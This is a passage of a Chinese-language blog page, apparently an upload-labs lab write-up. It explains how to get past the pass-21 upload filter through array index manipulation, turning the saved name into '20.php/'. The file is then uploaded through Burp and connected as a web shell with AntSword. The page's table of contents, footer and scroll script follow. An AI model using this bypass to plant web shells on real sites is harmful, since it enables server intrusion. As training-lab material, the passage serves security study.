+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo>[</mo><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">file[count(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>file) - 1]为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo>[</mo><mn>2</mn><mo>−</mo><mn>1</mn><mo>]</mo><mo>=</mo></mrow><annotation encoding="application/x-tex">file[2-1]=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>file[1]<br>
+，得到的拼接为空，得到的文件名为20.php/.</p>
+<p>上传文件，用burp抓包，修改参数：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789350328.png" alt="" loading="lazy"><br>
+上传成功，蚁剑连接：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789367478.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#less-14-getimagesize-%E5%9B%BE%E7%89%87%E9%A9%AC%E6%96%B9%E6%B3%95%E4%BA%8C">Less-14 getimagesize()-图片马方法二：</a></li>
+<li><a href="#pass-15getimagesize%E6%A3%80%E6%B5%8B">pass-15(getimagesize检测)</a></li>
+<li><a href="#pass-16exif_imagetype%E6%A3%80%E6%B5%8B">pass-16(exif_imagetype检测)</a></li>
+<li><a href="#pass-17%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87">pass-17(二次渲染绕过)</a></li>
+<li><a href="#pass-18%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89">pass-18(条件竞争)</a></li>
+<li><a href="#pass-19%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%892">pass-19(条件竞争2)</a></li>
+<li><a href="#pass-20">pass-20</a></li>
+<li><a href="#pass-21%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87">pass-21(数组绕过)</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/burpsuite-zhua-bu-dao-ben-di-bao-jie-jue-da-hui-zong/">
+              <h3 class="post-title">
+                BurpSuite抓不到本地包解决大汇总
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
